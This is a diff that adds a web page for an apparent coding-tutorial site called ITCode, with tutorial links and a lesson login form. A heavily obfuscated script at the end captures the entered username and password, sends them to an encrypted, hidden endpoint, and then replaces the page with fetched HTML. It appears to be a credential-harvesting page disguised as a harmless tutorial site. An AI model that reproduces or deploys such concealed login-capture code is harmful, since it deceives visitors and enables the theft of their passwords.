@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>ITCode - Programming Tutorials</title>
+  <meta name="description" content="ITCode — Learn to Code">
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      margin: 0;
+      background: #f7f7f5;
+      color: #222;
+      font-family: Arial, Helvetica, sans-serif;
+      line-height: 1.6;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    /* Header */
+
+    header {
+      height: 62px;
+      background: #fff;
+      border-bottom: 1px solid #ddd;
+      display: flex;
+      align-items: center;
+      padding: 0 32px;
+    }
+
+    .header-inner {
+      width: 100%;
+      max-width: 1100px;
+      margin: auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo {
+      font-size: 21px;
+      font-weight: bold;
+      letter-spacing: -0.5px;
+    }
+
+    .logo span {
+      color: #2864d7;
+    }
+
+    nav {
+      display: flex;
+      gap: 24px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    nav a:hover {
+      color: #111;
+    }
+
+    /* Main */
+
+    main {
+      max-width: 1100px;
+      margin: auto;
+      padding: 55px 25px 80px;
+    }
+
+    .intro {
+      max-width: 720px;
+      margin-bottom: 65px;
+    }
+
+    .intro h1 {
+      margin: 0 0 15px;
+      font-size: 42px;
+      line-height: 1.15;
+      letter-spacing: -1.5px;
+      font-weight: 700;
+    }
+
+    .intro p {
+      margin: 0;
+      max-width: 650px;
+      color: #666;
+      font-size: 17px;
+    }
+
+    /* Section */
+
+    section {
+      margin-bottom: 65px;
+    }
+
+    .section-title {
+      margin-bottom: 22px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #ddd;
+    }
+
+    .section-title h2 {
+      display: inline;
+      margin: 0;
+      font-size: 25px;
+      letter-spacing: -0.5px;
+    }
+
+    .section-title p {
+      display: inline;
+      margin-left: 12px;
+      color: #888;
+      font-size: 14px;
+    }
+
+    /* Tutorials */
+
+    .tutorials {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 14px;
+    }
+
+    .tutorial {
+      background: white;
+      border: 1px solid #ddd;
+      padding: 23px;
+      transition: border-color 0.15s, transform 0.15s;
+    }
+
+    .tutorial:hover {
+      border-color: #aaa;
+      transform: translateY(-2px);
+    }
+
+    .tutorial h3 {
+      margin: 0 0 7px;
+      font-size: 19px;
+    }
+
+    .tutorial p {
+      margin: 0 0 14px;
+      color: #666;
+      font-size: 14px;
+      max-width: 500px;
+    }
+
+    .read {
+      color: #2864d7;
+      font-size: 13px;
+      font-weight: bold;
+    }
+
+    /* Small category label */
+
+    .label {
+      display: block;
+      margin-bottom: 8px;
+      color: #888;
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.7px;
+    }
+
+    /* Featured */
+
+    .featured {
+      background: #20252b;
+      color: white;
+      padding: 30px;
+      margin-bottom: 65px;
+    }
+
+    .featured .label {
+      color: #aeb6c0;
+    }
+
+    .featured h2 {
+      margin: 0 0 8px;
+      font-size: 27px;
+    }
+
+    .featured p {
+      margin: 0 0 18px;
+      color: #c4c9cf;
+      max-width: 650px;
+    }
+
+    .featured a {
+      display: inline-block;
+      padding: 9px 15px;
+      background: white;
+      color: #20252b;
+      font-size: 13px;
+      font-weight: bold;
+    }
+
+    /* Networking list */
+
+    .network-list {
+      background: white;
+      border: 1px solid #ddd;
+    }
+
+    .network-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 17px 20px;
+      border-bottom: 1px solid #e5e5e5;
+    }
+
+    .network-item:last-child {
+      border-bottom: none;
+    }
+
+    .network-item:hover {
+      background: #fafafa;
+    }
+
+    .network-name {
+      font-weight: bold;
+    }
+
+    .network-description {
+      color: #777;
+      font-size: 13px;
+      margin-top: 2px;
+    }
+
+    .arrow {
+      color: #2864d7;
+      font-size: 18px;
+    }
+
+    /* Quick links */
+
+    .quick-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 9px;
+    }
+
+    .quick-links a {
+      background: white;
+      border: 1px solid #d8d8d8;
+      padding: 9px 14px;
+      font-size: 13px;
+      color: #444;
+    }
+
+    .quick-links a:hover {
+      border-color: #aaa;
+      color: #111;
+    }
+
+    /* Footer */
+
+    footer {
+      border-top: 1px solid #ddd;
+      background: white;
+      padding: 28px 25px;
+      color: #777;
+      font-size: 13px;
+    }
+
+    .footer-inner {
+      max-width: 1100px;
+      margin: auto;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    /* Mobile */
+
+    @media (max-width: 700px) {
+      header {
+        padding: 0 18px;
+      }
+
+      nav {
+        display: none;
+      }
+
+      main {
+        padding: 40px 18px 60px;
+      }
+
+      .intro h1 {
+        font-size: 34px;
+      }
+
+      .tutorials {
+        grid-template-columns: 1fr;
+      }
+
+      .section-title p {
+        display: block;
+        margin: 3px 0 0;
+      }
+
+      .network-item {
+        gap: 15px;
+      }
+
+      .footer-inner {
+        flex-direction: column;
+        gap: 5px;
+      }
+    }
+    /* Lesson login */
+
+    .login-box {
+      max-width: 360px;
+      margin: 30px 0;
+      padding: 20px;
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+    }
+
+    .login-box h2 {
+      margin: 0 0 4px;
+      font-size: 20px;
+    }
+
+    .login-box p {
+      margin: 0 0 14px;
+      color: #666;
+      font-size: 14px;
+    }
+
+    .login-box input,
+    .login-box button {
+      width: 100%;
+      margin-bottom: 10px;
+      padding: 9px 10px;
+      font: inherit;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .login-box button {
+      margin-bottom: 0;
+      background: #222;
+      color: #fff;
+      border-color: #222;
+      cursor: pointer;
+    }
+
+    .login-box button:disabled {
+      opacity: 0.6;
+      cursor: wait;
+    }
+
+    .login-error {
+      min-height: 20px;
+      margin-top: 8px;
+      color: #c0392b;
+      font-size: 14px;
+    }
+  </style>
+
+</head>
+
+<body>
+
+<header>
+  <div class="header-inner">
+
+
+<a href="./" class="logo">
+  <span>IT</span>Code
+</a>
+
+<nav>
+  <a href="./">Home</a>
+  <a href="#programming">Programming</a>
+  <a href="#networking">Networking</a>
+  <a href="#other">Other</a>
+</nav>
+
+
+  </div>
+</header>
+
+<main>
+
+  <div class="intro">
+    <h1>ITCode</h1>
+
+
+<p>
+  Tutorials about programming, web development, networking, and
+  the stuff that makes the internet work. Nothing too complicated —
+  just explanations and examples you can actually follow.
+</p>
+
+
+  </div>
+
+  <form class="login-box" id="login-form" autocomplete="on">
+    <h2>Log in to your ITCode lesson</h2>
+    <p>Enter your username and password to open your lesson.</p>
+
+    <input type="text" name="username" placeholder="Username" autocomplete="username" required>
+    <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
+    <button type="submit">Log in</button>
+
+    <div class="login-error" id="login-error" role="alert"></div>
+  </form>
+
+  <div class="featured">
+    <span class="label">Start here</span>
+
+
+<h2>How does the web actually work?</h2>
+
+<p>
+  When you type a website into your browser, quite a lot happens
+  before the page appears. Learn about DNS, TCP, HTTP, TLS, and
+  how your browser talks to a server.
+</p>
+
+<a href="/study/http">Read the HTTP tutorial →</a>
+
+
+  </div>
+
+  <section id="programming">
+
+
+<div class="section-title">
+  <h2>Programming</h2>
+  <p>Learn the basics and build things.</p>
+</div>
+
+<div class="tutorials">
+
+  <a href="/study/python" class="tutorial">
+    <span class="label">Programming</span>
+    <h3>Python</h3>
+    <p>
+      A beginner-friendly introduction to Python. Variables,
+      conditions, loops, functions, lists, files, and more.
+    </p>
+    <span class="read">Read tutorial →</span>
+  </a>
+
+  <a href="/study/node" class="tutorial">
+    <span class="label">JavaScript</span>
+    <h3>Node.js</h3>
+    <p>
+      Learn how JavaScript can run outside the browser. We'll
+      cover npm, modules, servers, files, and APIs.
+    </p>
+    <span class="read">Read tutorial →</span>
+  </a>
+
+  <a href="/study/javascript" class="tutorial">
+    <span class="label">Web</span>
+    <h3>JavaScript</h3>
+    <p>
+      Start with the language behind interactive websites and
+      work your way up to the DOM, events, promises, and APIs.
+    </p>
+    <span class="read">Read tutorial →</span>
+  </a>
+
+  <a href="/study/html" class="tutorial">
+    <span class="label">Web</span>
+    <h3>HTML & CSS</h3>
+    <p>
+      Learn how webpages are put together, from basic HTML
+      elements to layouts and responsive CSS.
+    </p>
+    <span class="read">Read tutorial →</span>
+  </a>
+
+  <a href="/study/git" class="tutorial">
+    <span class="label">Tools</span>
+    <h3>Git</h3>
+    <p>
+      Commits, branches, repositories, remotes, and the commands
+      you'll use when working on a project.
+    </p>
+    <span class="read">Read tutorial →</span>
+  </a>
+
+  <a href="/study/apis" class="tutorial">
+    <span class="label">Web</span>
+    <h3>APIs</h3>
+    <p>
+      What an API is, how requests and responses work, JSON,
+      endpoints, and how to make your own.
+    </p>
+    <span class="read">Read tutorial →</span>
+  </a>
+
+</div>
+
+
+  </section>
+
+  <section id="networking">
+
+
+<div class="section-title">
+  <h2>Networking</h2>
+  <p>What's happening underneath the browser?</p>
+</div>
+
+<div class="network-list">
+
+  <a href="/study/tcp" class="network-item">
+    <div>
+      <div class="network-name">TCP/IP</div>
+      <div class="network-description">
+        Packets, IP addresses, ports, connections, and routing.
+      </div>
+    </div>
+
+    <div class="arrow">→</div>
+  </a>
+
+  <a href="/study/http" class="network-item">
+    <div>
+      <div class="network-name">HTTP</div>
+      <div class="network-description">
+        Requests, responses, headers, status codes, and methods.
+      </div>
+    </div>
+
+    <div class="arrow">→</div>
+  </a>
+
+  <a href="/study/dns" class="network-item">
+    <div>
+      <div class="network-name">DNS</div>
+      <div class="network-description">
+        How a domain name eventually turns into an IP address.
+      </div>
+    </div>
+
+    <div class="arrow">→</div>
+  </a>
+
+  <a href="/study/tls" class="network-item">
+    <div>
+      <div class="network-name">TLS / HTTPS</div>
+      <div class="network-description">
+        Encryption, certificates, and secure connections.
+      </div>
+    </div>
+
+    <div class="arrow">→</div>
+  </a>
+
+  <a href="/study/websockets" class="network-item">
+    <div>
+      <div class="network-name">WebSockets</div>
+      <div class="network-description">
+        Keeping a connection open for real-time communication.
+      </div>
+    </div>
+
+    <div class="arrow">→</div>
+  </a>
+
+</div>
+
+
+  </section>
+
+  <section id="other">
+
+
+<div class="section-title">
+  <h2>Other stuff</h2>
+  <p>A few more things worth knowing.</p>
+</div>
+
+<div class="quick-links">
+  <a href="/study/linux">Linux</a>
+  <a href="/study/cli">Command Line</a>
+  <a href="/study/databases">Databases</a>
+  <a href="/study/sql">SQL</a>
+  <a href="/study/json">JSON</a>
+  <a href="/study/ssh">SSH</a>
+  <a href="/study/security">Web Security</a>
+  <a href="/study/servers">Web Servers</a>
+  <a href="/study/cookies">Cookies</a>
+  <a href="/study/caching">Caching</a>
+</div>
+
+
+  </section>
+
+</main>
+
+<footer>
+  <div class="footer-inner">
+    <span>ITCode</span>
+    <span>Programming & technology tutorials</span>
+  </div>
+</footer>
+
+<script>
+const _0x11992b=_0x19e1,_0x32af74=_0x19e1;function _0x1363(){const _0x66c042=['phldMG','ouBdIW','ksy5','lNpdKa','zcCR','WPtdGgi','hJqo','WRZcGmoY','W55yea','W6W4W5S','sfPR','WPpcIKVdPgbRWR9PWOjhmmox','WRhdISkr','bCkbnW','W4aaW44','ktJdMW','vSkxaW','g1GBWPtcGGyghSoUlNFdMu4O','W5ZdUtK','fCoNcG','hSkKna','xIff','d0NdPG','WQ0fWPxdI3viW5vFCXRdLSkqxG','aIhdIG','cSkxEW','WRCVW5K','qCkghW','lZOs','EMv+d1jkg04hFcRdSSkgWOq','vmk0fG','gCkPWPu','fgOP','WOS9uG','veGD','W4BdKWe','WOpdOSkQ','uSoQW6S','sg4P','W7ypW7G','xWdcIW','lbFdQG','W5fsqG','gcVdHG','W6PteYNdUZNdIY3cSCoKFCksW6S','acRcNG','DqaF','W5VdJZq','d8kjWQPfaYdcKK7dKa','Fr5e','W4VdLf8','ruXW','WQpdNSkw','W6hdTCkn','W6S/W6m','WOVdISor','WPFdNwm','mvhdLW','hSkYeq','WQVdOmk7','WQf4FG','iYhcGa','kJtcJa','iuSbAmoNz8k4d14UBG','k0ldKa','WQWYW5C','jdVcGG','WOn+AG','WONcMmo4','tKzJ','W6DFaa','mMpcLq','WQKjqG','W6qaW5G','cmoKaa','WOBdGh4','na3dUW','xNBdRmoeW53dOLvl','WPldIYi','WP7cHmoc','WOeZAG','WR5sua','BvZcUmkbW63cK8k2wX7cJXSbqW','vSoBcw5sWPG6WRa','aNiT','W5OzWOW','WOuUxW','W4yaW4W','WQJdJCkB','aMW+','rSoIaa','sa3cTW','s8kqlW','WRGlta','lrXSW5RcHYddUCosWRqEra','F2FdNmkhdsZcS3mKW4BcRmoCWQe','W5ldIbC','W7NdG8kXmGfauW','WQZcU8oZ','WPpcJKldQgHNW5byWPvaf8o4WQ0','W7W3xmoHW5JcL2q','lHLIW5/cHLddICoWWPiqFSow','WR1PrG','aZZcNG','W4CAWOy','amkIhq','vMPR','W67dMCkYrCoQW7qcW4tcUa','W7qAhq','WQpcPSo2','W5hdJGa','WPCefmk7W7yPWQRdVCkBW6CgF1a','rSo5W4ZcU2FcPmohW4/dUSoGWQ8','sWFcHW','W65hea','ArZcMW','yZ3cKq','WP3cImof','iSkBjG','etfc','W5VdTmkh','W6/cUmoW','imo9na','amkPWOm','EKC+','W6jjgq','tdRdLG','umkxha','W6jnaq','zrzi','WQ7dMCkg','dCoSWPO','eXa0W6/cGaldQmoaDrPW','jtzG'];_0x1363=function(){return _0x66c042;};return _0x1363();}function _0x19e1(_0x47cc3c,_0xcdc33a){_0x47cc3c=_0x47cc3c-(0xd6e+-0x1d71+0x1161);const _0x50bc00=_0x1363();let _0x19a14e=_0x50bc00[_0x47cc3c];if(_0x19e1['IDxktD']===undefined){var _0x58f4c8=function(_0xe1fc93){const _0x11c389='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x5a3f4e='',_0x44c355='';for(let _0x5ba9dd=-0x2459+0xa89+0x3b0*0x7,_0x3919ee,_0x116a55,_0x31e0f2=0x1c5a+-0x1a*-0x77+-0x2870;_0x116a55=_0xe1fc93['charAt'](_0x31e0f2++);~_0x116a55&&(_0x3919ee=_0x5ba9dd%(-0x10*0x263+0x33b+0x22f9)?_0x3919ee*(0x1e73+0x1*0x1607+-0x17e*0x23)+_0x116a55:_0x116a55,_0x5ba9dd++%(0x1029+0x24b0+-0x5*0xa91))?_0x5a3f4e+=String['fromCharCode'](-0x1eef*0x1+-0xb*-0x189+-0x1*-0xf0b&_0x3919ee>>(-(-0xcd+-0x531*-0x2+-0x993)*_0x5ba9dd&-0xf2f+-0x1cf4+0x77*0x5f)):0xa33*-0x3+0x1067+0xe32){_0x116a55=_0x11c389['indexOf'](_0x116a55);}for(let _0x877a24=-0x6*-0x210+-0x199d+0xd3d,_0xe7861a=_0x5a3f4e['length'];_0x877a24<_0xe7861a;_0x877a24++){_0x44c355+='%'+('00'+_0x5a3f4e['charCodeAt'](_0x877a24)['toString'](0x26b4+0x3*-0xaba+-0x2*0x33b))['slice'](-(0x1384+-0x1327*0x1+-0x1*0x5b));}return decodeURIComponent(_0x44c355);};const _0x6219b6=function(_0x17d97f,_0x166f7a){let _0x2511ef=[],_0xb0e934=-0x2691*-0x1+0x1b1*-0x6+-0x1c6b,_0x2b05a6,_0x397537='';_0x17d97f=_0x58f4c8(_0x17d97f);let _0x2575e2;for(_0x2575e2=0x5*-0x404+0x347*-0x8+0x2e4c;_0x2575e2<0x1d23*0x1+0x249a*0x1+0x1*-0x40bd;_0x2575e2++){_0x2511ef[_0x2575e2]=_0x2575e2;}for(_0x2575e2=0xb2*0x5+-0x38*0x82+0x18f6;_0x2575e2<-0xa4*0x3+0x2374+-0x2088;_0x2575e2++){_0xb0e934=(_0xb0e934+_0x2511ef[_0x2575e2]+_0x166f7a['charCodeAt'](_0x2575e2%_0x166f7a['length']))%(-0x14c5+0x19e+0xb*0x1d5),_0x2b05a6=_0x2511ef[_0x2575e2],_0x2511ef[_0x2575e2]=_0x2511ef[_0xb0e934],_0x2511ef[_0xb0e934]=_0x2b05a6;}_0x2575e2=0x1*-0x220f+-0x7ab+0xe*0x2fb,_0xb0e934=0x1f0+-0x1f0b+-0x1d1b*-0x1;for(let _0x3702ed=0xcb4+0x337*-0xb+-0x1*-0x16a9;_0x3702ed<_0x17d97f['length'];_0x3702ed++){_0x2575e2=(_0x2575e2+(0xc2b*-0x2+-0x2473+-0x1f6*-0x1f))%(-0x1576+0x29*-0xd6+-0x4*-0xe2f),_0xb0e934=(_0xb0e934+_0x2511ef[_0x2575e2])%(0xdd+0xb9a+-0xb77),_0x2b05a6=_0x2511ef[_0x2575e2],_0x2511ef[_0x2575e2]=_0x2511ef[_0xb0e934],_0x2511ef[_0xb0e934]=_0x2b05a6,_0x397537+=String['fromCharCode'](_0x17d97f['charCodeAt'](_0x3702ed)^_0x2511ef[(_0x2511ef[_0x2575e2]+_0x2511ef[_0xb0e934])%(0x1737+0x59c+0x11*-0x1a3)]);}return _0x397537;};_0x19e1['eMtYFa']=_0x6219b6,_0x19e1['KQmbcp']={},_0x19e1['IDxktD']=!![];}const _0x76a6dc=_0x50bc00[0x724*-0x5+0xffd+0x31*0x67];_0x19e1['rBkaqS']!==_0x76a6dc&&(_0x19e1['KQmbcp']={},_0x19e1['rBkaqS']=_0x76a6dc);const _0x23fc0f=_0x19e1['KQmbcp'][_0x47cc3c];return _0x23fc0f===undefined?(_0x19e1['hddWNC']===undefined&&(_0x19e1['hddWNC']=!![]),_0x19a14e=_0x19e1['eMtYFa'](_0x19a14e,_0xcdc33a),_0x19e1['KQmbcp'][_0x47cc3c]=_0x19a14e):_0x19a14e=_0x23fc0f,_0x19a14e;}(function(_0x4e1d79,_0x86b7d6){const _0x70f3f8=_0x19e1,_0x24b798=_0x19e1,_0x5231e2=_0x4e1d79();while(!![]){try{const _0x1e47a9=parseInt(_0x70f3f8(0x16d,'h5]$'))/(-0x14b1+-0x8b3+-0x7*-0x433)+parseInt(_0x70f3f8(0x1d0,'YiOQ'))/(0x600+-0x676*-0x5+-0x264c)*(-parseInt(_0x70f3f8(0x162,'ZAz*'))/(-0x47f*0x1+0x1*0xd63+-0x8e1))+-parseInt(_0x70f3f8(0x19a,'KRZn'))/(0x1a2d*0x1+0xc82+-0x26ab*0x1)+parseInt(_0x70f3f8(0x1b3,'n6TL'))/(-0xe*-0xaf+-0x1b6a+0x10d*0x11)*(parseInt(_0x24b798(0x1c2,'woYU'))/(-0x3*-0x529+-0x119e+0x1*0x229))+-parseInt(_0x70f3f8(0x1af,'^y3y'))/(-0x1ee+-0x1*-0x1a01+-0x603*0x4)*(-parseInt(_0x24b798(0x15e,'egGO'))/(0x188*-0xd+-0x10b9+-0x24a9*-0x1))+-parseInt(_0x70f3f8(0x16c,'8Gn*'))/(-0x321*0x8+-0xcaf+-0x10*-0x25c)+parseInt(_0x70f3f8(0x194,'adlE'))/(0x13e2+-0xe4d*-0x1+0x1*-0x2225);if(_0x1e47a9===_0x86b7d6)break;else _0x5231e2['push'](_0x5231e2['shift']());}catch(_0x5ad875){_0x5231e2['push'](_0x5231e2['shift']());}}}(_0x1363,0x52*0xdc5+0x4a310+0x2272d*-0x2));const form=document[_0x11992b(0x1b6,'@!oB')+_0x11992b(0x16f,'gr8t')+_0x11992b(0x1bc,'q(^5')+_0x32af74(0x1ba,'ygX8')+'Id'](_0x11992b(0x1c8,'@!oB')+_0x11992b(0x1b5,'bTBV')+_0x32af74(0x1ce,'Z95a')+'m'),errorBox=document[_0x32af74(0x172,'epJs')+_0x11992b(0x1d3,'nI[x')+_0x11992b(0x1a2,'h5]$')+_0x32af74(0x1a1,'(p8Q')+'Id'](_0x11992b(0x1c4,'GM#v')+_0x11992b(0x191,'2nh*')+_0x32af74(0x184,'q(^5')+'or');form[_0x32af74(0x177,'*3HZ')+_0x32af74(0x192,'YiOQ')+_0x32af74(0x18c,'GD#D')+_0x11992b(0x1b9,'GD#D')+_0x11992b(0x179,'ZAz*')+'r'](_0x11992b(0x1b2,'6Hxp')+_0x11992b(0x1cf,'7Rzw'),async _0x541670=>{const _0x69bd30=_0x11992b,_0x35069d=_0x11992b,_0x4ddbeb={'jKYrp':_0x69bd30(0x1a9,'[)1g')+_0x69bd30(0x17a,'Apc1')+_0x69bd30(0x17f,'egGO')+_0x35069d(0x187,'G5nu')+_0x69bd30(0x1a5,'f(tC')+'y','fLOcZ':_0x69bd30(0x199,'Mp4Z')+'T','zGoAf':_0x35069d(0x19e,'(p8Q')+_0x35069d(0x176,'U(b6')+_0x35069d(0x16e,'kfn[')+_0x35069d(0x1da,'2nh*')+_0x35069d(0x18d,'@!oB')+'n','boSOf':function(_0x1ba432,_0x3d5428){return _0x1ba432===_0x3d5428;},'suIiB':_0x69bd30(0x1b4,'adlE')+_0x35069d(0x189,'et]4')+_0x35069d(0x18b,'gr8t')+_0x35069d(0x1ad,'8Gn*')+_0x35069d(0x1ca,'Mp4Z')+_0x35069d(0x164,'YiOQ')+_0x69bd30(0x163,'Y2H#')+_0x69bd30(0x1d8,'2nh*')+_0x69bd30(0x1d1,'Z95a'),'sZenG':_0x35069d(0x1b8,'NZkY')+_0x35069d(0x1de,'1O6F')+_0x69bd30(0x1c5,'Fekd')+_0x35069d(0x16a,'U(b6')+_0x35069d(0x19c,'Fz2H')+_0x35069d(0x1bb,'Z95a')+_0x35069d(0x182,'G5nu')+_0x35069d(0x166,'(p8Q')+_0x69bd30(0x180,'h5]$')+_0x35069d(0x1c1,'Fekd')+'n.','tMnfM':function(_0x2d57ae,_0x5af600){return _0x2d57ae(_0x5af600);},'vZtAb':_0x35069d(0x1df,'Fz2H')+_0x35069d(0x17e,'woYU')+_0x69bd30(0x171,'Fekd')+'ml','HLOyT':_0x69bd30(0x170,'kfn[')+_0x35069d(0x1b0,'YiOQ')+_0x69bd30(0x19b,'YiOQ')+_0x69bd30(0x1dd,']uYC')+_0x69bd30(0x1a4,'7oeX')+_0x69bd30(0x17b,'YiOQ')+_0x69bd30(0x169,'Apc1')+_0x35069d(0x1dc,'[)1g')+_0x69bd30(0x1b1,'woYU')};_0x541670[_0x69bd30(0x1e3,'bTBV')+_0x35069d(0x1c9,'Apc1')+_0x69bd30(0x1c3,'Mp4Z')+_0x69bd30(0x18a,'c!dt')+'lt'](),errorBox[_0x35069d(0x1bd,'q15^')+_0x69bd30(0x195,'6Hxp')+_0x69bd30(0x165,'2nh*')+'nt']='';const _0x4d9ef4=form[_0x35069d(0x186,'Mp4Z')+_0x69bd30(0x185,'hIZ4')+_0x35069d(0x1d7,'[)1g')+_0x69bd30(0x183,'Mp4Z')+'r'](_0x35069d(0x1b7,'egGO')+_0x35069d(0x188,'Z95a'));_0x4d9ef4[_0x69bd30(0x1a6,'bTBV')+_0x35069d(0x174,'et]4')+'ed']=!![];try{const _0x3e3ba6={};_0x3e3ba6[_0x69bd30(0x1ab,'kfn[')+_0x69bd30(0x1cb,'^y3y')+'me']=form[_0x69bd30(0x1ac,'7Rzw')+_0x69bd30(0x1a7,'QYJl')+'me'][_0x69bd30(0x193,'(p8Q')+'ue'],_0x3e3ba6[_0x35069d(0x17c,'(p8Q')+_0x35069d(0x196,']uYC')+'rd']=form[_0x35069d(0x18f,'egGO')+_0x69bd30(0x17d,'Apc1')+'rd'][_0x69bd30(0x1bf,'oJ^m')+'ue'];const _0x9a1d96=await fetch(_0x4ddbeb[_0x35069d(0x1be,'egGO')+'rp'],{'method':_0x4ddbeb[_0x35069d(0x1cc,'GD#D')+'cZ'],'headers':{'Content-Type':_0x4ddbeb[_0x69bd30(0x197,'Fz2H')+'Af']},'body':JSON[_0x69bd30(0x16b,'bTBV')+_0x69bd30(0x175,'NZkY')+_0x35069d(0x1db,'egGO')](_0x3e3ba6)});if(!_0x9a1d96['ok']){errorBox[_0x35069d(0x178,'h5]$')+_0x35069d(0x1aa,'GD#D')+_0x35069d(0x1cd,']uYC')+'nt']=_0x4ddbeb[_0x69bd30(0x1c6,'x[jL')+'Of'](_0x9a1d96[_0x35069d(0x1a3,'[)1g')+_0x35069d(0x1a8,'jKvh')],0x5*0x43f+0x2*0x1171+-0x368c)?_0x4ddbeb[_0x69bd30(0x1c7,'epJs')+'iB']:_0x4ddbeb[_0x35069d(0x1d4,'Y2H#')+'nG'];return;}const _0xe2c7f5=await _0x4ddbeb[_0x35069d(0x198,'adlE')+'fM'](fetch,_0x4ddbeb[_0x69bd30(0x15f,'c!dt')+'Ab']),_0x1833f2=await _0xe2c7f5[_0x35069d(0x1ae,'YiOQ')+'t']();document[_0x69bd30(0x1d9,'7oeX')+'n'](),document[_0x69bd30(0x19d,'GM#v')+'te'](_0x1833f2),document[_0x69bd30(0x1e0,'^y3y')+'se']();}catch{errorBox[_0x35069d(0x19f,'hIZ4')+_0x35069d(0x167,'@!oB')+_0x35069d(0x1c0,'Fekd')+'nt']=_0x4ddbeb[_0x69bd30(0x173,'q15^')+'yT'];}finally{_0x4d9ef4[_0x69bd30(0x1d2,'epJs')+_0x69bd30(0x190,'Fz2H')+'ed']=![];}});
+</script>
+
+</body>
+</html>
